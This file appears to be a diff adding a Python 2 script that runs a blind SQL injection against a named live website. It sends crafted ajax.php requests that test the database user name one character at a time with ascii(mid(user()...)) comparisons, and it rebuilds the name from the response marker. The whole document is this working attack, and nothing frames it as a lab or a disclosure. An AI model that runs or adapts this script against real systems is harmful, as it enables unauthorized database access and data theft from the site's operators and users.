@@ -1,0 +1,127 @@
+#encoding=utf-8
+
+
+
+import httplib
+
+
+
+import time
+
+
+
+import string
+
+
+
+import sys
+
+
+
+import random
+
+
+
+import urllib
+
+
+
+
+
+
+
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+
+
+
+
+
+
+
+payloads = list(string.ascii_lowercase)
+
+
+
+for i in range(0,10):
+
+
+
+    payloads.append(str(i))
+
+
+
+payloads += ['@','_', '.', '-', '\\', ' ']
+
+
+
+
+
+print 'Try to retrive user:'
+
+
+
+user = ''
+
+
+
+for i in range(1,26):
+
+
+
+    for payload in payloads:
+
+       
+
+            conn = httplib.HTTPConnection('bug.sanguosha.com', timeout=80)
+
+        
+
+            s = "/ajax.php?a=list&clienttype=0&e=0&g=1 and ascii(mid(user()from(%s)for(1)))=%s AND 1=1 --&page=1&status=100" % (i, ord(payload))
+
+
+
+            s=urllib.quote(s,'?,=,&,/')
+
+
+
+            conn.request(method='GET', url= s,
+
+
+
+                         headers = headers)
+
+
+
+            html_doc = conn.getresponse().read()
+
+
+
+            conn.close()
+
+
+
+            print '.',
+
+
+
+            #print html_doc
+
+
+
+            if html_doc.find('11090') > 0:  # True
+
+
+
+                user += payload
+
+
+
+                print '\n[in progress]', user
+
+
+
+                break
+
+
+
+print '\n[Done] User is:', user
